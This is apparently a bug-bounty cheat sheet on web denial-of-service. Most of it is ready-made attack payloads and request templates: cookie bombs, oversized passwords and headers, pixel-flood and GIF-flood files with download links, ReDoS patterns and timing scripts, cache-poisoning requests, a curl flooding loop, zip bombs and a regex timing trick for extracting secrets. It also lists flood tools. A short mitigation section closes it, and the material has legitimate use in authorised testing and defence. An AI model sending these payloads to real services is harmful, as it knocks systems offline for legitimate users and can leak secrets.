## 1. Overview (Theory)

**Denial of Service (DoS)** is an attack that disrupts normal service functionality, preventing legitimate users from accessing it. The goal is to overwhelm system resources (CPU, memory, bandwidth, disk) or exploit logical flaws that cause excessive processing.

### Types:

- **DoS**: Single-machine attack (flooding or logic abuse)
- **DDoS**: Distributed attack using multiple compromised machines
- **Application-layer DoS**: Targets specific application vulnerabilities (e.g., ReDoS, algorithmic complexity)

### Common Attack Vectors:

- Resource exhaustion (CPU, memory, bandwidth, disk)
- Algorithmic complexity exploitation
- Cache poisoning
- Regex backtracking (ReDoS)
- Protocol abuse (HTTP, TCP, ICMP)

---

## 2. Exploitation Methods

### 2.1 Cookie Bomb

**What it does**: Exploits cookies to store excessive data, causing browser/server overload.

**Steps**:

1. Find parameter reflected in cookies
2. Send large payload:
    
    ```
    https://target.com/index.php?param1=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
    ```
    
3. Check if cookie value mirrors the input
4. Increase payload size until DoS occurs

---

### 2.2 Input Length Attacks

**What it does**: Sends extremely long inputs to exhaust CPU/memory during processing (especially password hashing).

**Steps**:

1. Identify input fields (password, email, username)
2. Send massive payload:
    
    ```http
    POST /register HTTP/1.1Host: target.comusername=victim&password=aaaaaaaaaaaaaaaaaaaaaaaaaaaa[...repeat 10,000+ times]
    ```
    
3. Monitor response time/server behavior

**Targets**:

- Registration forms
- Login forms
- Password reset
- Search fields
- Comment boxes

---

### 2.3 Pixel Flood (Image-based)

**What it does**: Uploads images with massive pixel dimensions to exhaust memory/processing.

**Steps**:

1. Find image upload functionality
2. Upload specially crafted image with huge resolution (e.g., 99999x99999 pixels)
3. Server attempts to process → memory exhaustion

**Payload**: [Download lottapixel3.jpg](https://daffa.tech/lottapixel3.jpg)

---

### 2.4 Frame Flood (GIF-based)

**What it does**: Uploads GIF with thousands of frames to overwhelm processing.

**Steps**:

1. Find GIF upload feature
2. Upload GIF with excessive frames
3. Server processes all frames → CPU/memory exhaustion

**Payload**: [Download uber.gif](https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/000/136/902000ac102f14a36a4d83ed9b5c293017b77fc7/uber.gif)

---

### 2.5 Image Resize Parameter Abuse

**What it does**: Exploits dynamic image resizing to cause excessive processing.

**Steps**:

1. Find image URLs with size parameters:
    
    ```
    https://target.com/img/photo.jpg?width=500&height=500
    ```
    
2. Amplify to extreme values:
    
    ```
    https://target.com/img/photo.jpg?width=99999999999&height=99999999999
    ```
    
3. Server attempts resize → resource exhaustion

---

### 2.6 Header Manipulation

**What it does**: Sends malformed or oversized headers to crash/overload servers.

**Techniques**:

**A. Header Duplication**:

```http
GET / HTTP/1.1
Host: target.com
Accept-Encoding: gzip, gzip, deflate, br, br, gzip, deflate
```

**B. Oversized Headers**:

```http
GET / HTTP/1.1
Host: target.com
X-Custom-Header: [10MB of data]
```

---

### 2.7 Regular Expression DoS (ReDoS)

**What it does**: Exploits inefficient regex patterns causing catastrophic backtracking.

**Vulnerable Regex Patterns**:

```regex
(a+)+
([a-zA-Z]+)*
(a|aa)+
(a|a?)+
(.*a){x}   # where x > 10
(\w*)+$
```

**Attack Steps**:

1. Identify input validated by regex
2. Craft payload with repeating characters + non-matching suffix:
    
    ```
    aaaaaaaaaaaaaaaaaaaaaaaaaa!
    ```
    
3. Send payload → exponential backtracking → CPU exhaustion

**Example Payloads**:

```python
# For pattern: (\w*)+$
payload = "a" * 30 + "!"

# For pattern: (\w*_)*\w*$
payload = "v" + "_" * 30 + "!"

# For pattern: (.*a){100}$
payload = "a" * 100 + "!"
```

**Testing Script**:

```python
import re, time

pat = re.compile(r'(\w*_)*\w*$')
for n in [2**k for k in range(8, 15)]:
    s = 'v' + '_'*n + '!'
    t0 = time.time()
    pat.search(s)
    dt = time.time() - t0
    print(f"{n} chars: {dt:.3f}s")
```

---

### 2.8 CPDoS (Cache Poisoned Denial of Service)

#### A. HTTP Header Oversize (HHO)

**What it does**: Sends headers larger than origin supports but smaller than cache supports.

```http
GET /index.html HTTP/1.1
Host: victim.com
X-Oversized-Header-1: [massive value exceeding origin limit]
```

**Result**: Origin returns 400, cache stores error page, legitimate users get cached error.

---

#### B. HTTP Meta Character (HMC)

**What it does**: Bypasses cache with harmful meta characters in headers.

```http
GET /index.html HTTP/1.1
Host: victim.com
X-Malicious-Header: \r\n\r\nINJECTED
```

**Result**: Cache stores malformed response.

---

#### C. HTTP Method Override (HMO)

**What it does**: Abuses method override headers to poison cache.

```http
GET /index.php HTTP/1.1
Host: victim.com
X-HTTP-Method-Override: POST
```

**Result**: Cache stores 404/error for GET requests.

---

#### D. X-Forwarded Headers

```http
GET /index.php?cache_key=unique HTTP/1.1
Host: www.target.com
X-Forwarded-Port: 123456
X-Forwarded-Host: malicious.com:999
```

**Result**: Cache poisoning with invalid port/host.

---

### 2.9 Rate Limit Bypass → Accidental DoS

**What it does**: Exploiting missing rate limits causes server overload.

**Steps**:

1. Find endpoint with no rate limiting
2. Script rapid-fire requests:
    
    ```bash
    while true; do curl -X POST https://target.com/api/send; done
    ```
    
3. Server resources exhausted from legitimate automation

---

### 2.10 File Upload DoS

**What it does**: Uploads massive/malicious files to exhaust disk/bandwidth/processing.

**Techniques**:

- Upload 10GB+ files
- Upload zip bombs (small compressed, huge uncompressed)
- Upload files requiring heavy processing (video transcoding, PDF parsing)

**Example**:

```http
POST /upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data

[10GB file]
```

---

### 2.11 Slow HTTP Attacks

**What it does**: Sends HTTP requests slowly to keep connections open, exhausting connection pool.

**Types**:

- **Slowloris**: Slow headers
- **Slow POST**: Slow body
- **R-U-Dead-Yet**: Slow reads

**Tools**:

- Slowhttptest
- PyLoris

---

### 2.12 Directory Fuzzing DoS

**What it does**: Excessive fuzzing threads overwhelm server.

```bash
feroxbuster -H "User-Agent: TEST" -w wordlist.txt -u https://target.com -t 200
```

**Impact**: High thread count + large wordlist = accidental DoS.

---

## 3. Advanced ReDoS Exploitation

### String Exfiltration via ReDoS

**Scenario**: You control the regex, need to exfil sensitive data (flag/secret).

**Concept**: Regex matches = long processing time. No match = fast.

**Example Payloads**:

```regex
^(?=<FLAG_PREFIX>)((.*)*)*salt$
^(?=HTB{)(((((((.*)*)*)*)*)*)*)!
^(?=secret_).*.*.*.*.*.*.*.*!!!!$
```

**Attack**:

1. Brute-force flag char-by-char
2. If regex matches current prefix → timeout (correct char)
3. If no match → fast response (wrong char)

---

### ReDoS Payloads (Control Both Input & Regex)

```javascript
// Test payloads
[
  "(a|a?)+$",
  "(\\w*)+$",
  "(a*)+$",
  "(.*a){100}$",
  "([a-zA-Z]+)*$",
  "(a+)*$"
].forEach(regexp => {
  const input = "a".repeat(30) + "!";
  const t0 = Date.now();
  new RegExp(regexp).test(input);
  const t1 = Date.now();
  console.log(`${regexp} took ${t1-t0}ms`);
});
```

---

## 4. Top 10 Modern DoS Payloads

### 1. ReDoS - Email Validation

```regex
Pattern: ^([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})$
Payload: aaaaaaaaaaaaaaaaaaaaaaaaaaaa@b
```

### 2. ReDoS - Generic

```regex
Pattern: (\w*)+$
Payload: aaaaaaaaaaaaaaaaaaaaaaaaaaaa!
```

### 3. Cookie Bomb

```
https://target.com/?session=AAAAAAAAA[...repeat 100KB]
```

### 4. Massive Password

```http
POST /login HTTP/1.1
password=aaaaaaa[...repeat 1MB]
```

### 5. Image Resize

```
https://target.com/img.jpg?w=999999999&h=999999999
```

### 6. CPDoS - Method Override

```http
GET /api/data HTTP/1.1
X-HTTP-Method-Override: DELETE
```

### 7. Header Bomb

```http
GET / HTTP/1.1
X-Huge: [10MB data]
```

### 8. Frame Flood GIF

Upload: GIF with 100,000+ frames

### 9. Pixel Flood

Upload: 1x1 pixel declared as 99999x99999

### 10. Algorithmic Complexity

```http
POST /api/sort HTTP/1.1
{"numbers": [1000000, 999999, 999998, ..., 1]}  # Worst-case O(n²)
```

---

## 5. Higher Impact Scenarios

### 🎯 **Critical Business Logic DoS**

- **Payment processing freeze**: DoS during checkout = lost revenue
- **Account lockout**: Exhaust login attempts for all users
- **Inventory depletion**: Flood "add to cart" with reserved items

### 🎯 **Authentication Bypass via DoS**

- Crash auth service → fallback to weak/default credentials
- Overload MFA → bypass to direct login

### 🎯 **Cache Poisoning → Persistent DoS**

- Single CPDoS request → all users get error page until cache expires

### 🎯 **Data Exfiltration via ReDoS**

- Use timing side-channels to extract secrets char-by-char

### 🎯 **Distributed Systems**

- DoS one microservice → cascade failure across entire infrastructure

---

## 6. Mitigations

### Developer Side:

✅ **Rate limiting** on all endpoints  
✅ **Input validation**: Max length constraints  
✅ **Regex timeout limits** (e.g., 100ms)  
✅ Use **non-backtracking regex engines** (RE2, Rust regex)  
✅ **Resource quotas**: CPU/memory/disk limits per request  
✅ **CDN/WAF**: DDoS protection layers  
✅ **File upload limits**: Size, type, processing timeouts  
✅ **Cache validation**: Prevent CPDoS via header sanitization  
✅ **Connection limits**: Max concurrent connections per IP  
✅ **Async processing**: Heavy operations in background queues

### Testing/Pentester Side:

🔧 **Always coordinate with client** before stress testing  
🔧 Start with low thread counts, increase gradually  
🔧 Monitor target resources during tests  
🔧 Document impact threshold (requests/sec before failure)

---

## 7. Tools

|Tool|Purpose|
|---|---|
|[Regexploit](https://github.com/doyensec/regexploit)|Detect vulnerable regex + auto-generate evil inputs|
|[hping3](https://github.com/antirez/hping)|Packet flooding, SYN flood|
|[Slowhttptest](https://github.com/shekyan/slowhttptest)|Slow HTTP attacks|
|[Feroxbuster](https://github.com/epi052/feroxbuster)|Directory fuzzing (careful with threads!)|
|[Hulk](https://github.com/grafov/hulk)|HTTP flood (use with caution)|
|[GoldenEye](https://github.com/jseidl/GoldenEye)|Layer 7 DoS|
|[ReDoS Detector](https://github.com/tjenkinson/redos-detector)|Analyze regex safety|
|[Devina ReDoS Checker](https://devina.io/redos-checker)|Online regex vulnerability checker|

---

## 8. Quick Reference: Testing Workflow

```
1. Recon → Identify attack surface (forms, uploads, APIs)
2. Baseline → Normal request timing
3. Exploit → Send malicious payload
4. Measure → Response time, errors, resource usage
5. Iterate → Increase payload size until DoS
6. Document → Impact, steps, mitigation
```

---

## References

- [OWASP DoS Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html)
- [CPDoS Attack Research](https://cpdos.org/)
- [ReDoS Paper (2024)](https://arxiv.org/abs/2406.11618)
- [HackerOne Reports: #840598, #105363, #390, #400, #751904, #861170, #892615, #511381, #409370]